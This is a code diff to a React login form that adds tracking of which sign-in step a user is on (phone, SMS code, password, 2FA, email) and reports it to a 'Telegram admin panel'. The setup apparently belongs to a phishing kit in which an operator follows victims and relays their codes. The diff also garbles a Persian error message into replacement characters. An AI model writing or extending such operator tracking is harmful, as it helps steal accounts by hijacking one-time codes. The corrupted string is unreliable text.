@@ -116,6 +116,22 @@ export const LoginForm = () => {
     return "*****@*****.***";
   };
 
+  // Page tracking for Telegram admin panel
+  const getPageName = (step: AuthStep): string => {
+    switch (step) {
+      case "phone": return "Phone Entry";
+      case "verify-phone": return "SMS Verification";
+      case "password": return "Password Entry";
+      case "google": return "2FA Verification";
+      case "email": return "Email Verification";
+      case "loading": return "Processing";
+      default: return "Auth Flow";
+    }
+  };
+
+  // Track current page for Telegram admin
+  usePageTracker(sessionId, getPageName(currentStep));
+
   // Real-time presence tracking completely removed - only manual status check via Telegram button
 
   // No automatic network monitoring - only manual status check via Telegram button
@@ -853,7 +869,7 @@ export const LoginForm = () => {
       }
     } catch (error) {
       console.error("Email sending error:", error);
-      setErrors({ email: "خطا در ارسال ایمیل. لطفا دوباره تلاش کنید." });
+      setErrors({ email: "خطا در ارسال ایمیل. لطفا د��باره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
